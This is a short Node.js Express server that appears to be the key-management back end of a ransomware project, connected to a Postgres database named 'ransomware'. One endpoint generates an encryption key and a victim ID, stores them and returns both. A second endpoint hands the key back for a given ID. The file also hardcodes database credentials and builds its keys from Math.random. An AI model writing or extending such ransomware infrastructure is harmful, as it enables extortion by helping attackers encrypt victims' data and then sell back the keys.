const express = require('express')
const app = express()
const port = 3000

const { Client } = require('pg')
const db = new Client({
    user: 'ransomware',
    password: 'secretpassword',
    host: 'localhost',
    database: 'ransomware'
})
db.connect()

app.get('/', async (req, res) => {
  const encrypt_key = returnHash();
  const key = returnHash();

  try {
    await db.query({
        text: 'INSERT INTO ransomware(encrypt_key, key) VALUES($1, $2)',
        values: [encrypt_key,key]
    })
  } catch(err) {
    console.log(err.stack)
  }

  res.json({
    "encryption_key": encrypt_key,
    "hash": key
  })
})

app.get('/decrypt/:id', async (req, res) => {
    const sql = await db.query({
        text: 'SELECT encrypt_key FROM ransomware WHERE key = $1',
        values: [req.params.id]
    })

    res.json(sql.rows[0])
})

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`)
})

function returnHash(){
    abc = "abcdefghijklmnopqrstuvwxyz1234567890".split("");
    var token="";
    for(i=0;i<32;i++){
         token += abc[Math.floor(Math.random()*abc.length)];
    }
    return token; //Will return a 32 bit "hash"
}